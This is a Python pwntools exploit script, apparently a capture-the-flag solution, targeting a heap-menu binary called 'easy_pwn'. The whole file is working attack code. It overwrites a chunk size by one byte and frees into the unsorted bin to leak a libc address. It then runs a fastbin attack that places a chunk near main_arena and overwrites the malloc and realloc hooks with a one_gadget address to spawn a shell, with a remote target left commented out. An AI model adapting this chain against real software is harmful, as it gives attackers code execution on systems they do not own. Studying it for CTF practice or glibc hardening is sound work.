from pwn import *
# from LibcSearcher import *

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.log_level = "debug"
elf = ELF("./easy_pwn")
p = process("./easy_pwn")
# p = remote("127.0.0.1", 12345)
def allocate(size):
	p.recvuntil("choice: ")
	p.sendline("1")
	p.recvuntil("size: ")
	p.sendline(str(size))

def update(index, size, content):
	p.recvuntil("choice: ")
	p.sendline("2")
	p.recvuntil("index: ")
	p.sendline(str(index))
	p.recvuntil("size: ")
	p.sendline(str(size))
	p.recvuntil("content: ")
	p.send(content)

def view(index):
	p.recvuntil("choice: ")
	p.sendline("4")
	p.recvuntil("index: ")
	p.sendline(str(index))

def delete(index):
	p.recvuntil("choice: ")
	p.sendline("3")
	p.recvuntil("index: ")
	p.sendline(str(index))

# leak libc
allocate(0x18) # 0 
allocate(0x40) # 1
allocate(0x60) # 2
allocate(0x10) # 3
payload = 0x18 * "a" + "\xc1"
update(0, 0x18+10, payload)
delete(1)
allocate(0x40) # 1
view(2)

addr = u64(p.recvuntil("\x7f")[-6:].ljust(8, "\x00"))
libc.address = addr - 0x3c4b78
main_arena = addr - 0x58
one_gadget = libc.address + 0x4526a # 45216 f02a4 f1147 4526a
realloc=libc.symbols["realloc"]

chunk_addr = main_arena + 0x20 + 5
fake_addr = main_arena - 0x33

allocate(0x60) # 4 zhixiang 2
delete(2)

payload = p64(fake_addr) + p64(0)
update(4,len(payload), payload)

allocate(0x60) # 2
allocate(0x60) # 5 at main_arena

payload = (0x13-0x8) * "a"
payload += p64(one_gadget)
payload += p64(realloc+0x2) 

update(5, len(payload), payload)
allocate(0x10)
p.interactive()


